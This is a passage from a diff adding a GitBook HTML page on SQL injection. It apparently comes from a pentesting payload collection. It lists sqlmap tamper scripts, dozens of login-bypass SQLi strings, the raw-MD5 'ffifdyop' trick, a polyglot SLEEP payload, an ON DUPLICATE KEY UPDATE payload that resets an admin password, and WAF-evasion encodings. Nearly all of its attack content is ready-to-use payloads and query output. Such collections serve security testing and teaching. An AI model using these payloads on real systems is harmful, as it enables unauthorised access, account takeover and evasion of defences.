+<td>space2mysqldash.py</td>
+<td>Replaces space character (&apos; &apos;) with a dash comment (&apos;--&apos;) followed by a new line (&apos;\n&apos;)</td>
+</tr>
+<tr>
+<td>space2plus.py</td>
+<td>Replaces space character (&apos; &apos;) with plus (&apos;+&apos;)</td>
+</tr>
+<tr>
+<td>space2randomblank.py</td>
+<td>Replaces space character (&apos; &apos;) with a random blank character from a valid set of alternate characters</td>
+</tr>
+<tr>
+<td>symboliclogical.py</td>
+<td>Replaces AND and OR logical operators with their symbolic counterparts (&amp;&amp; and</td>
+<td></td>
+<td>)</td>
+</tr>
+<tr>
+<td>unionalltounion.py</td>
+<td>Replaces UNION ALL SELECT with UNION SELECT</td>
+</tr>
+<tr>
+<td>unmagicquotes.py</td>
+<td>Replaces quote character (&apos;) with a multi-byte combo %bf%27 together with generic comment at the end (to make it work)</td>
+</tr>
+<tr>
+<td>uppercase.py</td>
+<td>Replaces each keyword character with upper case value &apos;INSERT&apos;</td>
+</tr>
+<tr>
+<td>varnish.py</td>
+<td>Append a HTTP header &apos;X-originating-IP&apos;</td>
+</tr>
+<tr>
+<td>versionedkeywords.py</td>
+<td>Encloses each non-function keyword with versioned MySQL comment</td>
+</tr>
+<tr>
+<td>versionedmorekeywords.py</td>
+<td>Encloses each keyword with versioned MySQL comment</td>
+</tr>
+<tr>
+<td>xforwardedfor.py</td>
+<td>Append a fake HTTP header &apos;X-Forwarded-For&apos;</td>
+</tr>
+</tbody>
+</table>
+<h2 id="authentication-bypass">Authentication bypass</h2>
+<pre><code class="lang-sql">&apos;-&apos;
+&apos; &apos;
+&apos;&amp;&apos;
+&apos;^&apos;
+&apos;*&apos;
+&apos; or 1=1 limit 1 -- -+
+&apos;=&quot;or&apos;
+&apos; or &apos;&apos;-&apos;
+&apos; or &apos;&apos; &apos;
+&apos; or &apos;&apos;&amp;&apos;
+&apos; or &apos;&apos;^&apos;
+&apos; or &apos;&apos;*&apos;
+&apos;-||0&apos;
+&quot;-||0&quot;
+&quot;-&quot;
+&quot; &quot;
+&quot;&amp;&quot;
+&quot;^&quot;
+&quot;*&quot;
+&quot; or &quot;&quot;-&quot;
+&quot; or &quot;&quot; &quot;
+&quot; or &quot;&quot;&amp;&quot;
+&quot; or &quot;&quot;^&quot;
+&quot; or &quot;&quot;*&quot;
+or true--
+&quot; or true--
+&apos; or true--
+&quot;) or true--
+&apos;) or true--
+&apos; or &apos;x&apos;=&apos;x
+&apos;) or (&apos;x&apos;)=(&apos;x
+&apos;)) or ((&apos;x&apos;))=((&apos;x
+&quot; or &quot;x&quot;=&quot;x
+&quot;) or (&quot;x&quot;)=(&quot;x
+&quot;)) or ((&quot;x&quot;))=((&quot;x
+or 2 like 2
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+admin&apos; --
+admin&apos; -- -
+admin&apos; #
+admin&apos;/*
+admin&apos; or &apos;2&apos; LIKE &apos;1
+admin&apos; or 2 LIKE 2--
+admin&apos; or 2 LIKE 2#
+admin&apos;) or 2 LIKE 2#
+admin&apos;) or 2 LIKE 2--
+admin&apos;) or (&apos;2&apos; LIKE &apos;2
+admin&apos;) or (&apos;2&apos; LIKE &apos;2&apos;#
+admin&apos;) or (&apos;2&apos; LIKE &apos;2&apos;/*
+admin&apos; or &apos;1&apos;=&apos;1
+admin&apos; or &apos;1&apos;=&apos;1&apos;--
+admin&apos; or &apos;1&apos;=&apos;1&apos;#
+admin&apos; or &apos;1&apos;=&apos;1&apos;/*
+admin&apos;or 1=1 or &apos;&apos;=&apos;
+admin&apos; or 1=1
+admin&apos; or 1=1--
+admin&apos; or 1=1#
+admin&apos; or 1=1/*
+admin&apos;) or (&apos;1&apos;=&apos;1
+admin&apos;) or (&apos;1&apos;=&apos;1&apos;--
+admin&apos;) or (&apos;1&apos;=&apos;1&apos;#
+admin&apos;) or (&apos;1&apos;=&apos;1&apos;/*
+admin&apos;) or &apos;1&apos;=&apos;1
+admin&apos;) or &apos;1&apos;=&apos;1&apos;--
+admin&apos;) or &apos;1&apos;=&apos;1&apos;#
+admin&apos;) or &apos;1&apos;=&apos;1&apos;/*
+1234 &apos; AND 1=0 UNION ALL SELECT &apos;admin&apos;, &apos;81dc9bdb52d04dc20036dbd8313ed055
+admin&quot; --
+admin&quot; #
+admin&quot;/*
+admin&quot; or &quot;1&quot;=&quot;1
+admin&quot; or &quot;1&quot;=&quot;1&quot;--
+admin&quot; or &quot;1&quot;=&quot;1&quot;#
+admin&quot; or &quot;1&quot;=&quot;1&quot;/*
+admin&quot;or 1=1 or &quot;&quot;=&quot;
+admin&quot; or 1=1
+admin&quot; or 1=1--
+admin&quot; or 1=1#
+admin&quot; or 1=1/*
+admin&quot;) or (&quot;1&quot;=&quot;1
+admin&quot;) or (&quot;1&quot;=&quot;1&quot;--
+admin&quot;) or (&quot;1&quot;=&quot;1&quot;#
+admin&quot;) or (&quot;1&quot;=&quot;1&quot;/*
+admin&quot;) or &quot;1&quot;=&quot;1
+admin&quot;) or &quot;1&quot;=&quot;1&quot;--
+admin&quot;) or &quot;1&quot;=&quot;1&quot;#
+admin&quot;) or &quot;1&quot;=&quot;1&quot;/*
+1234 &quot; AND 1=0 UNION ALL SELECT &quot;admin&quot;, &quot;81dc9bdb52d04dc20036dbd8313ed055
+</code></pre>
+<h2 id="authentication-bypass-raw-md5">Authentication Bypass (Raw MD5)</h2>
+<p>When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.</p>
+<pre><code class="lang-php"><span class="hljs-string">&quot;SELECT * FROM admin WHERE pass = &apos;&quot;</span>.md5($password,<span class="hljs-keyword">true</span>).<span class="hljs-string">&quot;&apos;&quot;</span>
+</code></pre>
+<p>Allowing an attacker to craft a string with a <code>true</code> statement such as <code>&apos; or &apos;SOMETHING</code></p>
+<pre><code class="lang-php">md5(<span class="hljs-string">&quot;ffifdyop&quot;</span>, <span class="hljs-keyword">true</span>) = <span class="hljs-string">&apos;or&apos;</span><span class="hljs-number">6</span>&#xFFFD;]&#xFFFD;&#xFFFD;!r,&#xFFFD;&#xFFFD;b
+</code></pre>
+<p>Challenge demo available at <a href="http://web.jarvisoj.com:32772" target="_blank">http://web.jarvisoj.com:32772</a></p>
+<h2 id="polyglot-injection-multicontext">Polyglot injection (multicontext)</h2>
+<pre><code class="lang-sql">SLEEP(1) <span class="hljs-comment">/*&apos; or SLEEP(1) or &apos;&quot; or SLEEP(1) or &quot;*/</span>
+</code></pre>
+<h2 id="routed-injection">Routed injection</h2>
+<pre><code class="lang-sql">admin&apos; AND 1=0 UNION ALL <span class="hljs-keyword">SELECT</span> <span class="hljs-string">&apos;admin&apos;</span>, <span class="hljs-string">&apos;81dc9bdb52d04dc20036dbd8313ed055&apos;</span>
+</code></pre>
+<h2 id="insert-statement---on-duplicate-key-update">Insert Statement - ON DUPLICATE KEY UPDATE</h2>
+<p>ON DUPLICATE KEY UPDATE keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:</p>
+<pre><code class="lang-sql">Inject using payload:
+  attacker_dummy@example.com&quot;, &quot;bcrypt_hash_of_qwerty&quot;), (&quot;admin@example.com&quot;, &quot;bcrypt_hash_of_qwerty&quot;) ON DUPLICATE KEY <span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">&quot;bcrypt_hash_of_qwerty&quot;</span> <span class="hljs-comment">--</span>
+
+The <span class="hljs-keyword">query</span> would look <span class="hljs-keyword">like</span> this:
+<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">users</span> (email, <span class="hljs-keyword">password</span>) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&quot;attacker_dummy@example.com&quot;</span>, <span class="hljs-string">&quot;bcrypt_hash_of_qwerty&quot;</span>), (<span class="hljs-string">&quot;admin@example.com&quot;</span>, <span class="hljs-string">&quot;bcrypt_hash_of_qwerty&quot;</span>) <span class="hljs-keyword">ON</span> <span class="hljs-keyword">DUPLICATE</span> <span class="hljs-keyword">KEY</span> <span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">&quot;bcrypt_hash_of_qwerty&quot;</span> <span class="hljs-comment">-- &quot;, &quot;bcrypt_hash_of_your_password_input&quot;);</span>
+
+This <span class="hljs-keyword">query</span> will <span class="hljs-keyword">insert</span> a <span class="hljs-keyword">row</span> <span class="hljs-keyword">for</span> the <span class="hljs-keyword">user</span> &#x201C;attacker_dummy@example.com&#x201D;. It will also <span class="hljs-keyword">insert</span> a <span class="hljs-keyword">row</span> <span class="hljs-keyword">for</span> the <span class="hljs-keyword">user</span> &#x201C;<span class="hljs-keyword">admin</span>@example.com&#x201D;.
+Because this <span class="hljs-keyword">row</span> already <span class="hljs-keyword">exists</span>, the <span class="hljs-keyword">ON</span> <span class="hljs-keyword">DUPLICATE</span> <span class="hljs-keyword">KEY</span> <span class="hljs-keyword">UPDATE</span> keyword tells MySQL <span class="hljs-keyword">to</span> <span class="hljs-keyword">update</span> the <span class="hljs-string">`password`</span> <span class="hljs-keyword">column</span> <span class="hljs-keyword">of</span> the already existing <span class="hljs-keyword">row</span> <span class="hljs-keyword">to</span> <span class="hljs-string">&quot;bcrypt_hash_of_qwerty&quot;</span>.
+
+<span class="hljs-keyword">After</span> this, we can simply authenticate <span class="hljs-keyword">with</span> &#x201C;<span class="hljs-keyword">admin</span>@example.com&#x201D; <span class="hljs-keyword">and</span> the <span class="hljs-keyword">password</span> &#x201C;qwerty&#x201D;!
+</code></pre>
+<h2 id="waf-bypass">WAF Bypass</h2>
+<p>No Space (%20) - bypass using whitespace alternatives</p>
+<pre><code class="lang-sql">?id=1%09and%091=1%09<span class="hljs-comment">--</span>
+?id=1%0Dand%0D1=1%0D<span class="hljs-comment">--</span>
+?id=1%0Cand%0C1=1%0C<span class="hljs-comment">--</span>
+?id=1%0Band%0B1=1%0B<span class="hljs-comment">--</span>
+?id=1%0Aand%0A1=1%0A<span class="hljs-comment">--</span>
+?id=1%A0and%A01=1%A0<span class="hljs-comment">--</span>
+</code></pre>
+<p>No Whitespace - bypass using comments</p>
+<pre><code class="lang-sql">?id=1<span class="hljs-comment">/*comment*/</span>and<span class="hljs-comment">/**/</span>1=1<span class="hljs-comment">/**/</span><span class="hljs-comment">--</span>
+</code></pre>
+<p>No Whitespace - bypass using parenthesis</p>
+<pre><code class="lang-sql">?id=(1)and(1)=(1)<span class="hljs-comment">--</span>
+</code></pre>
+<p>No Comma - bypass using OFFSET, FROM and JOIN</p>
+<pre><code class="lang-sql">LIMIT 0,1         -&gt; LIMIT 1 OFFSET 0
+SUBSTR(&apos;SQL&apos;,1,1) -&gt; SUBSTR(&apos;SQL&apos; FROM 1 FOR 1).
+SELECT 1,2,3,4    -&gt; UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
+</code></pre>
+<p>No Equal - bypass using LIKE/NOT IN/IN</p>
+<pre><code class="lang-sql">?id=1 and substring(version(),1,1)like(5)
+?id=1 and substring(version(),1,1)not in(4,3)
+?id=1 and substring(version(),1,1)in(4,3)
+</code></pre>
+<p>Blacklist using keywords - bypass using uppercase/lowercase</p>
+<pre><code class="lang-sql">?id=1 AND 1=1#
+?id=1 AnD 1=1#
+?id=1 aNd 1=1#
+</code></pre>
+<p>Blacklist using keywords case insensitive - bypass using an equivalent operator</p>
+<pre><code class="lang-sql">AND   -&gt; &amp;&amp;
+OR    -&gt; ||
+=     -&gt; LIKE,REGEXP, not &lt; and not &gt;
+&gt; X   -&gt; not between 0 and X
+WHERE -&gt; HAVING
+</code></pre>
+<p>Information_schema.tables Alternative</p>
+<pre><code class="lang-sql">select * from mysql.innodb_table_stats;
++----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
+| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
++----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
+| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |
+| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |
+...
++----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
+
+mysql&gt; show tables in dvwa;
++----------------+
+| Tables_in_dvwa |
++----------------+
+| guestbook      |
+| users          |
++----------------+
+</code></pre>
+<p>Version Alternative</p>
+<pre><code class="lang-sql">mysql&gt; select @@innodb_version;
++------------------+
+| @@innodb_version |
++------------------+
+| 5.6.31           |
++------------------+
+
+mysql&gt; select @@version;
++-------------------------+
+| @@version               |
++-------------------------+
+| 5.6.31-0ubuntu0.15.10.1 |
++-------------------------+
+
+mysql&gt; mysql&gt; select version();
++-------------------------+
+| version()               |
++-------------------------+
+| 5.6.31-0ubuntu0.15.10.1 |
++-------------------------+
+</code></pre>
+<h2 id="references">References</h2>
+<ul>
+<li>Detect SQLi<ul>
+<li><a href="https://gerbenjavado.com/manual-sql-injection-discovery-tips/" target="_blank">Manual SQL Injection Discovery Tips</a></li>
+<li><a href="https://sqlwiki.netspi.com/" target="_blank">NetSPI SQL Injection Wiki</a></li>
+</ul>
+</li>
+<li>MySQL:<ul>
+<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet" target="_blank">PentestMonkey&apos;s mySQL injection cheat sheet</a></li>
+<li><a href="https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/" target="_blank">Reiners mySQL injection Filter Evasion Cheatsheet</a></li>
+<li><a href="https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/" target="_blank">Alternative for Information_Schema.Tables in MySQL</a></li>
+<li><a href="https://websec.ca/kb/sql_injection" target="_blank">The SQL Injection Knowledge base</a></li>
+</ul>
+</li>
+<li>MSSQL:<ul>
+<li><a href="http://evilsql.com/main/page2.php" target="_blank">EvilSQL&apos;s Error/Union/Blind MSSQL Cheatsheet</a></li>
+<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet" target="_blank">PentestMonkey&apos;s MSSQL SQLi injection Cheat Sheet</a></li>
+</ul>
+</li>
+<li>ORACLE:<ul>
+<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet" target="_blank">PentestMonkey&apos;s Oracle SQLi Cheatsheet</a></li>
+</ul>
+</li>
+<li>POSTGRESQL:<ul>
+<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet" target="_blank">PentestMonkey&apos;s Postgres SQLi Cheatsheet</a></li>
+</ul>
+</li>
+<li>Others<ul>
+<li><a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/" target="_blank">SQLi Cheatsheet - NetSparker</a></li>
+<li><a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html" target="_blank">Access SQLi Cheatsheet</a></li>
+<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet" target="_blank">PentestMonkey&apos;s Ingres SQL Injection Cheat Sheet</a></li>
+<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet" target="_blank">Pentestmonkey&apos;s DB2 SQL Injection Cheat Sheet</a></li>
+<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet" target="_blank">Pentestmonkey&apos;s Informix SQL Injection Cheat Sheet</a></li>
+<li><a href="https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet" target="_blank">SQLite3 Injection Cheat sheet</a></li>
+<li><a href="http://rails-sqli.org/" target="_blank">Ruby on Rails (Active Record) SQL Injection Guide</a></li>
+<li><a href="http://www.forkbombers.com/2016/07/sqlmap-tamper-scripts-update.html" target="_blank">ForkBombers SQLMap Tamper Scripts Update</a></li>
+<li><a href="https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/" target="_blank">SQLi in INSERT worse than SELECT</a></li>
+<li><a href="https://gerbenjavado.com/manual-sql-injection-discovery-tips/" target="_blank">Manual SQL Injection Tips</a></li>
+</ul>
+</li>
+<li>Second Order:<ul>
+<li><a href="https://www.notsosecure.com/analyzing-cve-2018-6376/" target="_blank">Analyzing CVE-2018-6376 &#x2013; Joomla!, Second Order SQL Injection</a></li>
+<li><a href="https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/" target="_blank">Exploiting Second Order SQLi Flaws by using Burp &amp; Custom Sqlmap Tamper</a></li>
+</ul>
+</li>
+<li>Sqlmap:<ul>
+<li><a href="https://twitter.com/zh4ck/status/972441560875970560" target="_blank">#SQLmap protip @zh4ck</a></li>
+</ul>
+</li>
+</ul>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="../命令注入/" class="navigation navigation-prev " aria-label="Previous page: 命令注入">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="MYSQL.md" class="navigation navigation-next " aria-label="Next page: MYSQL">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"SQL注入","level":"2.1.2","depth":2,"next":{"title":"MYSQL","level":"2.1.2.1","depth":3,"path":"SQL注入/MYSQL.md","ref":"SQL注入/MYSQL.md","articles":[]},"previous":{"title":"命令注入","level":"2.1.1","depth":2,"path":"命令注入/README.md","ref":"命令注入/README.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"SQL注入/README.md","mtime":"2019-09-15T21:19:08.000Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-09-16T07:03:19.203Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
